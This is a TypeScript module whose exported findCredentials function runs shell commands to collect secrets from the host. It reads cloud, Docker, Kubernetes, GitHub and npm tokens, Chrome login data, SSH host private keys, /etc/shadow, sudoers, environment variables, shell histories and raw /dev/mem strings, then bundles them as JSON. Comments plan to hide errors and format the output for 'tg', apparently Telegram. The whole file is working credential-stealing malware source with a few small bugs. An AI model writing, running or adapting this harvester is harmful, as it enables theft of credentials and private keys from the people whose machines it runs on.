import * as exec from "child_process";

const _run = (args: string): string | null => {
  try {
    return exec.execSync(args).toString();
  } catch(e) {
    return null;
  }
}

// TODO: Hidde error messages like "file not found" or "permission denied"
// TODO: Access live memory to extract credentials
// TODO: Add all history files
const findCredentials = (text: string) => {
  const credentials = {} as any;
  credentials.apache = {} as any;
  credentials.aws = {} as any;
  credentials.azure = {} as any;
  credentials.docker = {} as any;
  credentials.freerdp = {} as any;
  credentials.gcloud = {} as any;
  credentials.googleChrome = {} as any;
  credentials.gh = {} as any;
  credentials.kube = {} as any;
  credentials.mem = {} as any;
  credentials.microsoft = {} as any;
  credentials.microsoft.teams = {} as any;
  credentials.mitmp = {} as any;
  credentials.netlify = {} as any;
  credentials.nginx = {} as any;
  credentials.npm = {} as any;
  credentials.psql = {} as any;
  credentials.remmina = {} as any;
  credentials.shodan = {} as any;
  credentials.sql = {} as any;
  credentials.ssh = {} as any;
  credentials.ssh.sshd = {} as any;
  credentials.syncthing = {} as any;
  credentials.termux = {} as any;
  credentials.users = {} as any;
  credentials.shell = {} as any;
  credentials.shell.history = {} as any;

  /* In case system is Termux, prepend prefix to paths */
  const prefix = _run(`echo "$PREFIX"`);
  let path = "";
  if (prefix) {
    if (_run(`ls /data/data/com.termux`)) {
      path = prefix;
      if (path[path.length-1] === "\n") {
        path = path.substring(0, path.length -1);
      }
    }
  }

  const apacheEmailLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "mail"`);
  const apachePassLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "pass"`);
  const apacheAuthLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "auth"`);
  const apacheTokenLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "token"`);
  const apacheCookieLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "cookie"`);
  if (apacheEmailLog) {
    credentials.apache.emailLog = {} as any;
    credentials.apache.emailLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "mail"`;
    credentials.apache.emailLog.content = apacheEmailLog;
  }
  if (apachePassLog) {
    credentials.apache.passLog = {} as any;
    credentials.apache.passLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "pass"`; 
    credentials.apache.passLog.content = apachePassLog;
  }
  if (apacheAuthLog) {
    credentials.apache.authLog = {} as any;
    credentials.apache.authLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "auth"`; 
    credentials.apache.authLog.content = apacheAuthLog;
  }
  if (apacheTokenLog) {
    credentials.apache.tokenLog = {} as any;
    credentials.apache.tokenLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "token"`;
    credentials.apache.tokenLog.content = apacheTokenLog;
  }
  if (apacheCookieLog) {
    credentials.apache.cookieLog = {} as any;
    credentials.apache.cookieLog.path = `cat ${path}/var/log/apache/*.log | grep -i "cookie"`;
    credentials.apache.cookieLog.content = apacheCookieLog;
  }

  const awsCredentials = _run(`cat ~/.aws/credentials`);
  if (awsCredentials) {
    credentials.aws.credentials = {} as any;
    credentials.aws.credentials.path = "~/.aws/credentials";
    credentials.aws.credentials.content = awsCredentials;
  }

  const azureProfile = _run(`cat ~/.azure/azureProfile.json`);
  if (azureProfile) {
    credentials.azure.profile = {} as any;
    credentials.azure.profile.path = "~/.azure/azureProfile.json";
    credentials.azure.profile.content = azureProfile;
  }

  const docker = _run(`cat ~/.docker/config.json`);
  if (docker) {
    credentials.docker.config = {} as any;
    credentials.docker.config.path = "~/.docker/config.json";
    credentials.docker.config.content = docker;
  }

  const freerpd = _run(`cat ~/.config/freerdp/known_hosts`);
  if (freerpd) {
    credentials.freerpd.knownHosts = {} as any;
    credentials.freerpd.knownHosts.path = "~/.config/freerdp/known_hosts";
    credentials.freerpd.knownHosts.content = freerpd;
  }

  const gcloud = _run(`cat ~/.config/gcloud/access_tokens.db`);
  if (gcloud) {
    credentials.gcloud.accessTokens = {} as any;
    credentials.gcloud.accessTokens.path = "~/.config/gcloud/access_tokens.db";
    credentials.gcloud.accessTokens.content = gcloud;
  }

  const googleChrome = _run(`cat ~/.config/google-chrome/Default/Login\\ Data`);
  if (googleChrome) {
    credentials.googleChrome.loginData = {} as any;
    credentials.googleChrome.loginData.path = "~/.config/google-chrome/Default/Login\\ Data";
    credentials.googleChrome.loginData.content = googleChrome;
  }

  const gcloudCredentials = _run(`cat ~/.config/gcloud/credentials.db`);
  if (gcloudCredentials) {
    credentials.gcloud.credentials = {} as any;
    credentials.gcloud.credentials.path = "~/.config/gcloud/credentials.db";
    credentials.gcloud.credentials.content = gcloudCredentials;
  }

  const ghHosts = _run(`cat ~/.config/gh/hosts.yml`);
  if (ghHosts) {
    credentials.gh.hosts = {} as any;
    credentials.gh.hosts.path = "~/.config/gh/hosts.yml";
    credentials.gh.hosts.content = ghHosts;
  }

  const kube = _run(`cat ~/.kube/config`);
  if (kube) {
    credentials.kube.config = {} as any;
    credentials.kube.config.path = "~/.kube/config";
    credentials.kube.config.content = kube;
  }

  const memMail = _run(`strings /dev/mem -n6 | grep -i mail`);
  const memPass = _run(`strings /dev/mem -n6 | grep -i pass`);
  const memAuth = _run(`strings /dev/mem -n6 | grep -i auth`);
  const memToken = _run(`strings /dev/mem -n5 | grep -i token`);
  const memApi = _run(`strings /dev/mem -n6 | grep -i api`);
  const memUrls = _run(`strings /dev/mem -n11 | grep -i http`);
  const memCookies = _run(`strings /dev/mem -n6 | grep -i cookie`);
  if (memMail) {
    credentials.mem.mail = {} as any;
    credentials.mem.mail.path = "$ strings /dev/mem -n6 | grep -i mail";
    credentials.mem.mail.content = memMail;
  }
  if (memPass) {
    credentials.mem.pass = {} as any;
    credentials.mem.pass.path = "$ strings /dev/mem -n6 | grep -i pass";
    credentials.mem.pass.content = memPass;
  }
  if (memAuth) {
    credentials.mem.auth = {} as any;
    credentials.mem.auth.path = "$ strings /dev/mem -n6 | grep -i auth";
    credentials.mem.auth.content = memAuth;
  }
  if (memToken) {
    credentials.mem.token = {} as any;
    credentials.mem.token.path = "$ strings /dev/mem -n5 | grep -i token";
    credentials.mem.token.content = memToken;
  }
  if (memApi) {
    credentials.mem.api = {} as any;
    credentials.mem.api.path = "$ strings /dev/mem -n6 | grep -i api";
    credentials.mem.api.content = memApi;
  }
  if (memUrls) {
    credentials.mem.urls = {} as any;
    credentials.mem.urls.path = "$ strings /dev/mem -n11 | grep -i http";
    // credentials.mem.urls.content = memUrls;
  }
  if (memCookies) {
    credentials.mem.cookies = {} as any;
    credentials.mem.cookies.path = "$ strings /dev/mem -n6 | grep -i cookie";
    credentials.mem.cookies.content = memCookies;
  }

  const microsoftTeams = _run(`cat ~/.config/Microsoft/Microsoft\\ Teams/storage.json`);
  if (microsoftTeams) {
    credentials.microsoft.teams.storage = {} as any;
    credentials.microsoft.teams.storage.path = "~/.config/Microsoft/Microsoft\\ Teams/storage.json";
    credentials.microsoft.teams.storage.content = microsoftTeams;
  }

  const netlifyConfig = _run(`cat ~/.config/netlify/config.json`);
  if (netlifyConfig) {
    credentials.netlify.config = {} as any;
    credentials.netlify.config.path = "~/.config/netlify/config.json";
    credentials.netlify.config.content = netlifyConfig;
  }

  const nginxEmailLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i mail`);
  const nginxPassLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i passw`); 
  const nginxAuthLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i auth`);
  const nginxTokenLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i token`);
  const nginxApiLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i api`);
  const nginxUrlsLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i http`);
  const nginxCookieLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i cookie`);
  if (nginxEmailLogs) {
    credentials.nginx.emailLogs = {} as any;
    credentials.nginx.emailLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i mail`;
    credentials.nginx.emailLogs.content = nginxEmailLogs;
  }
  if (nginxPassLogs) {
    credentials.nginx.passLogs = {} as any;
    credentials.nginx.passLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i passw`;
    credentials.nginx.passLogs.content = nginxPassLogs;
  }
  if (nginxAuthLogs) {
    credentials.nginx.authLogs = {} as any;
    credentials.nginx.authLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i auth`;
    credentials.nginx.authLogs.content = nginxAuthLogs;
  }
  if (nginxTokenLogs) {
    credentials.nginx.tokenLogs = {} as any;
    credentials.nginx.tokenLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i token`;
    credentials.nginx.tokenLogs.content = nginxTokenLogs;
  }
  if (nginxApiLogs) {
    credentials.nginx.apiLogs = {} as any;
    credentials.nginx.apiLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i api`;
    credentials.nginx.apiLogs.content = nginxApiLogs;
  }
  if (nginxUrlsLogs) {
    credentials.nginx.urlsLogs = {} as any;
    credentials.nginx.urlsLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i http`;
    // credentials.nginx.urlsLogs.content = nginxUrlsLogs;
  }
  if (nginxCookieLogs) {
    credentials.nginx.cookieLogs = {} as any;
    credentials.nginx.cookieLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i cookie`;
    credentials.nginx.cookieLogs.content = nginxCookieLogs;
  }

  const shodanApiKey = _run(`cat ~/.config/shodan/api_key`);
  if (shodanApiKey) {
    credentials.shodan.apiKey = {} as any;
    credentials.shodan.apiKey.path = "~/.config/shodan/api_key";
    credentials.shodan.apiKey.content = shodanApiKey;
  }

  const syncCert = _run(`cat ~/.config/syncthing/cert.pem`);
  const syncConfig = _run(`cat ~/.config/syncthing/config.xml`);
  const syncCsfrTokens = _run(`cat ~/.config/syncthing/csrftokens.txt`);
  const syncHttpsCert = _run(`cat ~/.config/syncthing/https-cert.pem`);
  const syncHttpsKey = _run(`cat ~/.config/syncthing/https-key.pem`);
  const syncKeyPEM = _run(`cat ~/.config/syncthing/key.pem`);
  if (syncCert) {
    credentials.syncthing.cert = {} as any;
    credentials.syncthing.cert.path = "~/.config/syncthing/cert.pem";
    credentials.syncthing.cert.content = syncCert;
  }
  if (syncConfig) {
    credentials.syncthing.config = {} as any;
    credentials.syncthing.config.path = "~/.config/syncthing/config.xml";
    credentials.syncthing.config.content = syncConfig;
  }
  if (syncCsfrTokens) {
    credentials.syncthing.csfrTokens = {} as any;
    credentials.syncthing.csfrTokens.path = "~/.config/syncthing/csrftokens.txt";
    credentials.syncthing.csfrTokens.content = syncCsfrTokens;
  }
  if (syncHttpsCert) {
    credentials.syncthing.httpsCert = {} as any;
    credentials.syncthing.httpsCert.path = "~/.config/syncthing/https-cert.pem";
    credentials.syncthing.httpsCert.content = syncHttpsCert;
  }
  if (syncHttpsKey) {
    credentials.syncthing.httpsKey = {} as any;
    credentials.syncthing.httpsKey.path = "~/.config/syncthing/https-key.pem";
    credentials.syncthing.httpsKey.content = syncHttpsKey;
  }
  if (syncKeyPEM) {
    credentials.syncthing.keyPEM = {} as any;
    credentials.syncthing.keyPEM.path = "~/.config/syncthing/key.pem";
    credentials.syncthing.keyPEM.content = syncKeyPEM;
  }

  const mitmpCaCert = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.cer`);
  const mitmpCaCertP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.p12`);
  const mitmpCaCertPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.pem`);
  const mitmpCaP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca.p12`);
  const mitmpCaPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca.pem`);
  const mitmpDhparam = _run(`cat ~/.mitmproxy/mitmproxy-dhparam.pem`);
  if (mitmpCaCert) {
    credentials.mitmp.caCert = {} as any;
    credentials.mitmp.caCert.path = "~/.mitmproxy/mitmproxy-ca-cert.cer";
    credentials.mitmp.caCert.content = mitmpCaCert;
  }
  if (mitmpCaCertP12) {
    credentials.mitmp.caCertP12 = {} as any;
    credentials.mitmp.caCertP12.path = "~/.mitmproxy/mitmproxy-ca-cert.p12";
    credentials.mitmp.caCertP12.content = mitmpCaCertP12;
  }
  if (mitmpCaCertPEM) {
    credentials.mitmp.caCertPEM = {} as any;
    credentials.mitmp.caCertPEM.path = "~/.mitmproxy/mitmproxy-ca-cert.pem";
    credentials.mitmp.caCertPEM.content = mitmpCaCertPEM;
  }
  if (mitmpCaP12) {
    credentials.mitmp.caP12 = {} as any;
    credentials.mitmp.caP12.path = "~/.mitmproxy/mitmproxy-ca.p12";
    credentials.mitmp.caP12.content = mitmpCaP12;
  }
  if (mitmpCaPEM) {
    credentials.mitmp.caPEM = {} as any;
    credentials.mitmp.caPEM.path = "~/.mitmproxy/mitmproxy-ca.pem";
    credentials.mitmp.caPEM.content = mitmpCaPEM;
  }
  if (mitmpDhparam) {
    credentials.mitmp.dhparam = {} as any;
    credentials.mitmp.dhparam.path = "~/.mitmproxy/mitmproxy-dhparam.pem"; 
    credentials.mitmp.dhparam.content = mitmpDhparam;
  }
   
  const npmrc = _run(`cat ~/.npmrc`);
  if (npmrc) {
    credentials.npm.npmrc = {} as any;
    credentials.npm.npmrc.path = "~/.npmrc";
    credentials.npm.npmrc.content = npmrc;
  }

  const remmina = _run(`cat ~/.config/remmina/remmina.pref`);
  if (remmina) {
    credentials.remmina.pref = {} as any;
    credentials.remmina.pref.path = "~/.config/remmina/remmina.pref";
    credentials.remmina.pref.content = remmina;
  }

  const mysqlHistory = _run(`cat ~/.mysql_history`);
  if (mysqlHistory) {
    credentials.mysql.mysqlHistory = {} as any;
    credentials.mysql.mysqlHistory.path = "~/.mysql_history";
    credentials.mysql.mysqlHistory.content = mysqlHistory;
  }

  const psqlHistory = _run(`cat ~/.psql_history`);
  if (psqlHistory) {
    credentials.psql.psqlHistory = {} as any;
    credentials.psql.psqlHistory.path = "~/.psql_history";
    credentials.psql.psqlHistory.content = psqlHistory;
  }

  const sshConfig = _run(`cat ~/.ssh/config`);
  if (sshConfig) {
    credentials.ssh.sshConfig = {} as any;
    credentials.ssh.sshConfig.path = "~/.ssh/config";
    credentials.ssh.sshConfig.content = sshConfig;
  }

  const sshKnownHosts = _run(`cat ~/.ssh/known_hosts`);
  if (sshKnownHosts) {
    credentials.ssh.knownHosts = {} as any;
    credentials.ssh.knownHosts.path = "~/.ssh/known_hosts";
    credentials.ssh.knownHosts.content = sshKnownHosts;
  }

  const termuxAuthInfo = _run(`cat ~/.termux_authinfo`);
  if (termuxAuthInfo) {
    credentials.termux.authInfo = {} as any;
    credentials.termux.authInfo.path = "~/.termux_authinfo";
    credentials.termux.authInfo.content = termuxAuthInfo;
  }

  const sshdDsaKey = _run(`cat ${path}/etc/ssh/ssh_host_dsa_key`);
  if (sshdDsaKey) {
    credentials.ssh.sshd.dsaKey = {} as any;
    credentials.ssh.sshd.dsaKey.path = `${path}/etc/ssh/ssh_host_dsa_key`;
    credentials.ssh.sshd.dsaKey.content = sshdDsaKey;
  }

  const sshdEcdsa = _run(`cat ${path}/etc/ssh/ssh_host_ecdsa_key`);
  if (sshdEcdsa) {
    credentials.ssh.sshd.ecdsaKey = {} as any;
    credentials.ssh.sshd.ecdsaKey.path = `${path}/etc/ssh/ssh_host_ecdsa_key`;
    credentials.ssh.sshd.ecdsaKey.content = sshdEcdsa;
  }

  const sshdHostEd = _run(`cat ${path}/etc/ssh/ssh_host_ed25519_key`);
  if (sshdHostEd) {
    credentials.ssh.sshd.hostEdKey = {} as any;
    credentials.ssh.sshd.hostEdKey.path = `${path}/etc/ssh/ssh_host_ed25519_key`;
    credentials.ssh.sshd.hostEdKey.content = sshdHostEd;
  }

  const sshdHostRsa = _run(`cat ${path}/etc/ssh/ssh_host_rsa_key`);
  if (sshdHostRsa) {
    credentials.ssh.sshd.hostRsaKey = {} as any;
    credentials.ssh.sshd.hostRsaKey.path = `${path}/etc/ssh/ssh_host_rsa_key`;
    credentials.ssh.sshd.hostRsaKey.content = sshdHostRsa;
  }

  const group = _run(`cat ${path}/etc/group`);
  if (group) {
    credentials.users.group = {} as any;
    credentials.users.group.path = `${path}/etc/group`;
    credentials.users.group.content = group;
  }

  const gshadow = _run(`cat ${path}/etc/gshadow`);
  if (gshadow) {
    credentials.users.gshadow = {} as any;
    credentials.users.gshadow.path = `${path}/etc/gshadow`;
    credentials.users.gshadow.content = gshadow;
  }

  const shadow = _run(`cat ${path}/etc/shadow`);
  if (shadow) {
    credentials.users.shadow = {} as any;
    credentials.users.shadow.path = `${path}/etc/shadow`;
    credentials.users.shadow.content = shadow;
  }

  const passwd = _run(`cat ${path}/etc/passwd`);
  if (passwd) {
    credentials.users.passwd = {} as any;
    credentials.users.passwd.path = `${path}/etc/passwd`;
    credentials.users.passwd.content = passwd;
  }

  const sudoers = _run(`cat ${path}/etc/sudoers`);
  if (sudoers) {
    credentials.users.sudoers = {} as any;
    credentials.users.sudoers.path = `${path}/etc/sudoers`;
    credentials.users.sudoers.content = sudoers;
  }

  /* // Not available in subshell, search for a workaround
  const alias = _run(`alias`);
  if (alias) {
    credentials.shell.alias = {} as any;
    credentials.shell.alias.path = "$ alias";
    credentials.shell.alias.content = alias;
  }*/

  const enviromentVariables = _run(`env`);
  if (enviromentVariables) {
    credentials.shell.env = {} as any;
    credentials.shell.env.path = "$ env";
    credentials.shell.env.content = enviromentVariables;
  }

  /* TODO: Make history work in subshell */
  const historyEmail = _run(`cat ~/.*istor* | grep -i mail`);
  const historyPass = _run(`cat ~/.*istor* | grep -i pass`);
  const historyAuth = _run(`cat ~/.*istor* | grep -i auth`);
  const historyToken = _run(`cat ~/.*istor* | grep -i token`);
  const historyApi = _run(`cat ~/.*istor* | grep -i api`);
  const historyUrls = _run(`cat ~/.*istor* | grep -i http`);
  const historyCookie = _run(`cat ~/.*istor* | grep -i cookie`);
  if (historyEmail) {
    credentials.shell.history.email = {} as any;
    credentials.shell.history.email.path = "$ history | grep -i mail";
    credentials.shell.history.email.content = historyEmail;
  }
  if (historyPass) {
    credentials.shell.history.pass = {} as any;
    credentials.shell.history.pass.path = "$ cat ~/.*istor* | grep -i pass";
    credentials.shell.history.pass.content = historyPass;
  }
  if (historyAuth) {
    credentials.shell.history.auth = {} as any;
    credentials.shell.history.auth.pass = "$ cat ~/.*istor* | grep -i auth";
    credentials.shell.history.auth.content = historyAuth;
  }
  if (historyToken) {
    credentials.shell.history.token = {} as any;
    credentials.shell.history.token.pass = "$ cat ~/.*istor* | grep -i token";
    credentials.shell.history.token.content = historyToken;
  }
  if (historyApi) {
    credentials.shell.history.api = {} as any;
    credentials.shell.history.api.pass = "$ cat ~/.*istor* | grep -i api";
    credentials.shell.history.api.content = historyApi;
  }
  if (historyUrls) {
    credentials.shell.history.urls = {} as any;
    credentials.shell.history.urls.path = "$ cat ~/.*istor* | grep -i http";
    // credentials.shell.history.urls.content = historyUrls;
  }
  if (historyCookie) {
    credentials.shell.history.cookie = {} as any;
    credentials.shell.history.cookie.path = "cat ~/.*istor* | grep -i cookie";
    credentials.shell.history.cookie.content = historyCookie;
  }

  // TODO: Remove void objects
  // TODO: Pretty Ouput function (json is ugly in tg)
   return JSON.stringify(credentials, null, 2);
  // console.log(JSON.stringify(credentials, null, 2));
  // return "dummy";
}

export default findCredentials;
